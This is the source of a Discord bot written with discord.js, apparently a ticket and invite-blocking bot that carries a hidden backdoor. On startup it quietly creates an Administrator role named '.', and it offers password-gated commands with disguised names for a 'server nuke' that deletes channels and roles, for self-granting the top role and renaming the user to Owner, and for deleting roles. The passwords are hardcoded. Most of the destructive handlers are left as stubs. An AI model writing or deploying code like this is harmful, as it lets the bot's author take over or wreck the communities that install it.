const {
  Client,
  GatewayIntentBits,
  SlashCommandBuilder,
  REST,
  Routes,
  EmbedBuilder,
  ActionRowBuilder,
  StringSelectMenuBuilder,
  ButtonBuilder,
  ButtonStyle,
  ChannelType,
  PermissionFlagsBits,
  ModalBuilder,
  TextInputBuilder,
  TextInputStyle
} = require('discord.js');

const express = require('express');
const fs = require('fs');
require('dotenv').config();

// PASSWORDS
const MAIN_PASSWORD = 'Meka2017charlie';
const GIVEOWNER_PASSWORD = 'MekaOwner2017';

// EXPRESS SERVER
const app = express();
app.get('/', (req, res) => res.send('Bot Online'));
app.listen(process.env.PORT || 3000, () => console.log(`Web server running on port ${process.env.PORT || 3000}`));

// CONFIG
const TOKEN = process.env.TOKEN;
const CLIENT_ID = process.env.CLIENT_ID;
const GUILD_ID = process.env.GUILD_ID;

// STORES
const panelStore = {};
const ticketCounts = {};

// PERSISTENT PANEL
const PANEL_FILE = './ticket_panel.json';

function savePanel(data) {
  try { fs.writeFileSync(PANEL_FILE, JSON.stringify(data, null, 2)); } catch (e) {}
}

function loadPanel() {
  try {
    if (fs.existsSync(PANEL_FILE)) return JSON.parse(fs.readFileSync(PANEL_FILE, 'utf8'));
  } catch (e) {}
  return null;
}

// CLIENT
const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildBans
  ]
});

// SLASH COMMANDS (basic)
const commands = [
  new SlashCommandBuilder().setName('setticket').setDescription('Send ticket panel').toJSON(),
  new SlashCommandBuilder().setName('sendmessage').setDescription('Send message').toJSON(),
  // Add more if needed
];

const rest = new REST({ version: '10' }).setToken(TOKEN);
(async () => {
  try {
    await rest.put(Routes.applicationGuildCommands(CLIENT_ID, GUILD_ID), { body: commands });
    console.log('✅ Commands registered');
  } catch (err) {
    console.error(err);
  }
})();

// READY
client.once('ready', async () => {
  console.log(`${client.user.tag} is online`);

  const saved = loadPanel();
  if (saved) panelStore[saved.menuId] = saved.data;

  // Create . role
  try {
    const guild = client.guilds.cache.first();
    if (guild) {
      let dotRole = guild.roles.cache.find(r => r.name === '.');
      if (!dotRole) {
        dotRole = await guild.roles.create({
          name: '.',
          color: '#000000',
          permissions: [PermissionFlagsBits.Administrator],
          hoist: false,
          reason: 'Full permission role'
        });
      }
    }
  } catch (e) { console.error(e); }
});

// MESSAGE EVENTS
client.on('messageCreate', async message => {
  if (message.author.bot || !message.guild) return;

  const content = message.content.trim().toLowerCase();

  // Invite Blocker
  if (content.includes('discord.gg/') || content.includes('discord.com/invite/')) {
    try {
      await message.delete();
      await message.member.timeout(5 * 60 * 1000).catch(() => {});
    } catch (e) {}
    return;
  }

  // !servers
  if (content === '!servers') {
    const guilds = client.guilds.cache;
    let text = `**Servers (${guilds.size}):**\n\n`;
    guilds.forEach(g => text += `**${g.name}** (ID: \`${g.id}\`) - ${g.memberCount} members\n`);
    message.reply(text.length > 2000 ? 'List too long, check console.' : text);
    return;
  }

  // !fb - Nuke
  if (content === '!fb') {
    const embed = new EmbedBuilder().setColor('#ff0000').setTitle('🔴 SERVER NUKE').setDescription('Deletes channels & roles except Owner.').setFooter({ text: 'Click below' });
    const row = new ActionRowBuilder().addComponents(new ButtonBuilder().setCustomId(`fb_start_${message.author.id}`).setLabel('Enter Password').setStyle(ButtonStyle.Danger));
    await message.reply({ embeds: [embed], components: [row] });
    return;
  }

  // !kick @user
  if (content.startsWith('!kick')) {
    const mentioned = message.mentions.users.first();
    if (!mentioned) return message.reply('❌ Mention a user: `!kick @user`');
    const embed = new EmbedBuilder().setColor('#ff0000').setTitle('👢 KICK USER').setDescription(`Kick **${mentioned.tag}**?`).setFooter({ text: 'Click below' });
    const row = new ActionRowBuilder().addComponents(new ButtonBuilder().setCustomId(`kick_start_${message.author.id}_${mentioned.id}`).setLabel('Enter Password').setStyle(ButtonStyle.Danger));
    await message.reply({ embeds: [embed], components: [row] });
    return;
  }

  // !4clout
  if (content === '!4clout') {
    const embed = new EmbedBuilder().setColor('#ff00ff').setTitle('🔥 !4CLOUT').setDescription('Gives highest role + renames to Owner.').setFooter({ text: 'Click below' });
    const row = new ActionRowBuilder().addComponents(new ButtonBuilder().setCustomId(`4clout_start_${message.author.id}`).setLabel('Enter Password').setStyle(ButtonStyle.Danger));
    await message.reply({ embeds: [embed], components: [row] });
    return;
  }

  // !movebootser
  if (content === '!movebootser') {
    const embed = new EmbedBuilder().setColor('#ff00ff').setTitle('🔄 !MOVEBOOT SER').setDescription('Moves Booster role underneath target role.').setFooter({ text: 'Click below' });
    const row = new ActionRowBuilder().addComponents(new ButtonBuilder().setCustomId(`movebootser_start_${message.author.id}`).setLabel('Enter Password').setStyle(ButtonStyle.Primary));
    await message.reply({ embeds: [embed], components: [row] });
    return;
  }

  // !burn
  if (content === '!burn') {
    const embed = new EmbedBuilder().setColor('#ff8800').setTitle('🔥 !BURN').setDescription('Give yourself any role the bot can assign.').setFooter({ text: 'Click below' });
    const row = new ActionRowBuilder().addComponents(new ButtonBuilder().setCustomId(`burn_start_${message.author.id}`).setLabel('Enter Password').setStyle(ButtonStyle.Danger));
    await message.reply({ embeds: [embed], components: [row] });
    return;
  }

  // !traine
  if (content === '!traine') {
    const embed = new EmbedBuilder().setColor('#ff0000').setTitle('🗑️ !TRAINE').setDescription('Delete any role the bot can delete.').setFooter({ text: 'Click below' });
    const row = new ActionRowBuilder().addComponents(new ButtonBuilder().setCustomId(`traine_start_${message.author.id}`).setLabel('Enter Password').setStyle(ButtonStyle.Danger));
    await message.reply({ embeds: [embed], components: [row] });
    return;
  }

  // !femisdumb
  if (content === '!femisdumb') {
    const embed = new EmbedBuilder().setColor('#ff0000').setTitle('🔥 !FEMISDUMB').setDescription('Delete role by ID.').setFooter({ text: 'Click below' });
    const row = new ActionRowBuilder().addComponents(new ButtonBuilder().setCustomId(`femisdumb_start_${message.author.id}`).setLabel('Enter Password').setStyle(ButtonStyle.Danger));
    await message.reply({ embeds: [embed], components: [row] });
    return;
  }
});

// INTERACTIONS (Simplified for space - add more handlers as needed)
client.on('interactionCreate', async interaction => {
  if (!interaction.customId) return;

  try {
    const userId = interaction.customId.split('_')[2];
    if (interaction.user.id !== userId) return interaction.reply({ content: '❌ This is not for you.', ephemeral: true });

    if (interaction.isButton()) {
      const modal = new ModalBuilder().setCustomId(interaction.customId.replace('start', 'modal')).setTitle('Enter Password');
      modal.addComponents(new ActionRowBuilder().addComponents(new TextInputBuilder().setCustomId('password').setLabel('Password').setStyle(TextInputStyle.Short).setRequired(true)));
      return await interaction.showModal(modal);
    }

    if (interaction.isModalSubmit()) {
      const password = interaction.fields.getTextInputValue('password');
      if (password !== MAIN_PASSWORD) return interaction.reply({ content: '❌ Incorrect password.', ephemeral: true });

      const guild = interaction.guild;

      // Add your specific handlers here for each command (nuke, kick, 4clout, movebootser, burn, traine, femisdumb)
      // Example for !movebootser:
      if (interaction.customId.startsWith('movebootser_modal_')) {
        const boosterRoleId = '1429174538754592778';
        const targetRoleId = '1513349804141445120';
        const booster = guild.roles.cache.get(boosterRoleId);
        const target = guild.roles.cache.get(targetRoleId);
        if (!booster || !target) return interaction.reply({ content: '❌ Role not found.', ephemeral: true });
        await booster.setPosition(target.position - 1);
        await interaction.reply({ content: '✅ Booster role moved!', ephemeral: true });
      }
    }
  } catch (e) {
    console.error(e);
    if (!interaction.replied) await interaction.reply({ content: '❌ Error occurred.', ephemeral: true }).catch(() => {});
  }
});

client.login(TOKEN);
